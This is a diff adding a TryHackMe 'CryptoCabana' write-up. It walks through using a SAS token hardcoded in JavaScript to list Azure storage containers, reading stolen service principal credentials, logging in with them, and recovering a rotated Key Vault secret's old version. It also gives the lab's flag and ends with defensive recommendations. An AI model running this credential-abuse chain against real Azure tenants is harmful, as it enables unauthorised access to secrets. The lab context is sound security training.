@@ -1,0 +1,121 @@
+# Room Name - TryHackMe: CryptoCabana
+Date: 04 August 2026
+Difficulty: Medium
+Category: Cloud Security / Azure / Storage Account / Key Vault / Secret Version Recovery
+
+> Note: Credential values found during this investigation (client IDs, client secrets, SAS tokens, tenant IDs) have been redacted in this write-up. Publishing live or expired credentials in public repositories is poor practice regardless of the lab context, as values persist in git history and can be scraped by automated secret scanning tools.
+
+# Scenario
+By the time he made it back from the breakfast buffet, his wallet had already moved on without him. The CryptoCabana kiosk promised "Backed up. Sleep easy." but somewhere between that promise and this morning, something else got a good look at what was supposed to stay behind glass. The challenge involved finding over-permissioned credentials hardcoded in client-side JavaScript, pivoting from Azure Blob Storage to a Key Vault, and recovering a rotated secret's previous value from version history to assemble the full flag.
+
+# Tools Used
+- Azure CLI (az)
+- Azure Cloud Shell (Bash)
+- curl
+- Browser (page source / JS inspection)
+
+# What I Did
+
+**Step 1 — Extract hardcoded credentials from the kiosk JavaScript**
+- Accessed the landing page and inspected the linked app.js file.
+- Found hardcoded Azure Storage credentials:
+```javascript
+const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
+const BACKUPS_CONTAINER = "backups";
+const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&<redacted>";
+```
+- Identified that srt=sco in the SAS token granted service, container, and object level access across the entire storage account, not just the backups container.
+
+**Step 2 — Enumerate all containers using the over-permissioned SAS**
+- Listed all containers in the storage account:
+```
+curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&$SAS"
+```
+- Found three containers: $web, backups, and vault.
+- The backups container was empty. The vault container was the actual target.
+
+**Step 3 — List blobs in the vault container**
+- Enumerated blobs in the vault container:
+```
+curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&$SAS"
+```
+- Found two blobs: backup-service-account.json and seed_phrase.txt.
+
+**Step 4 — Read both vault files**
+- Retrieved the service account credentials file. The structure of what was found:
+```json
+{
+  "client_id": "<redacted>",
+  "client_secret": "<redacted>",
+  "key_vault_name": "ccabana-kv-f5scjagc",
+  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
+  "tenant_id": "<redacted>"
+}
+```
+- Retrieved the seed phrase file. The content was a 12-word BIP-39 seed phrase belonging to the wallet referenced in the room scenario.
+
+**Step 5 — Authenticate as the service principal**
+- Used the extracted credentials to log into Azure as the backup service principal:
+```
+az login --service-principal \
+  -u "<client_id>" \
+  -p "<client_secret>" \
+  --tenant "<tenant_id>"
+```
+
+**Step 6 — List and read Key Vault secrets**
+- Listed all secrets in the Key Vault:
+```
+az keyvault secret list --vault-name "ccabana-kv-f5scjagc" \
+  --query "[].{name:name}" -o table
+```
+- Found four secrets: key-shard-1, key-shard-2, key-shard-3, master-key.
+- Read each current secret value:
+  - key-shard-1: THM{n0t_ur
+  - key-shard-2 (current): "Rotated this after IT flagged it -- old value should still be recoverable if you know where to look."
+  - key-shard-3: ur_c01ns!}
+  - master-key: Forbidden (service principal lacked permission)
+
+**Step 7 — Recover the rotated secret's previous version**
+- Listed all versions of key-shard-2 to find the previous value:
+```
+az keyvault secret list-versions \
+  --vault-name "ccabana-kv-f5scjagc" \
+  --name "key-shard-2" \
+  --query "[].id" -o tsv
+```
+- Retrieved the older version directly by its version ID:
+```
+az keyvault secret show \
+  --id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/<version_id>" \
+  --query "value" -o tsv
+```
+- Recovered previous value: _k3ys_n0t_
+
+**Step 8 — Assemble the flag from all three shards**
+- Combined the three shard values in order:
+  - key-shard-1: THM{n0t_ur
+  - key-shard-2 (previous version): _k3ys_n0t_
+  - key-shard-3: ur_c01ns!}
+
+# What I Found
+- Hardcoded SAS token in client-side JavaScript with service-level (srt=sco) permissions
+- Storage account: cryptocabanaf5scjagc
+- Containers discovered: $web, backups, vault
+- Service principal credentials stored in vault container (backup-service-account.json) — values redacted
+- Seed phrase stored in vault container — value redacted
+- Key Vault: ccabana-kv-f5scjagc
+- Secrets found: key-shard-1, key-shard-2, key-shard-3, master-key
+- key-shard-2 previous version recovered via version history API
+- Flag: THM{n0t_ur_k3ys_n0t_ur_c01ns!}
+
+# Key Learning
+Azure Key Vault retains all previous versions of every secret by default and makes them queryable via the version history API. Rotating a secret does not delete its previous value — it only makes the new version the current one. An attacker with list-versions and get permissions can recover every historical value ever stored in a vault. The broader chain here began with a SAS token hardcoded in public JavaScript with scope far exceeding what the kiosk actually needed, which exposed a vault containing service principal credentials that should never have been stored in Blob Storage at all. Each individual mistake was survivable; together they created a path from zero to Key Vault access in four steps.
+
+# What I Would Flag in a Real SOC
+- SAS tokens hardcoded in publicly served client-side JavaScript are equivalent to publishing storage account credentials, all SAS tokens must be generated server-side on demand with the minimum required scope and a short expiry, never embedded in front-end code
+- A SAS token with srt=sco (service, container, object) scope grants access to every container in the storage account, not just the intended one, SAS tokens must be scoped to the specific container and operation required
+- Service principal credentials stored as blobs in Azure Storage are a critical secret exposure finding, credentials must be stored only in Key Vault or a dedicated secrets manager and never in general-purpose storage accounts
+- Azure Key Vault secret rotation without deletion of previous versions does not remove attacker access to historical values, secret rotation must be accompanied by disabling or purging old versions if the previous value is considered compromised
+- A service principal with Key Vault read access to all secrets represents excessive privilege, permissions must be scoped to specific secret names using Key Vault access policies or Azure RBAC at the secret level rather than the vault level
+- Splitting a flag or credential across multiple Key Vault secrets does not provide meaningful security if all secrets share the same access policy, defence requires separate access controls on each shard with different authorised identities
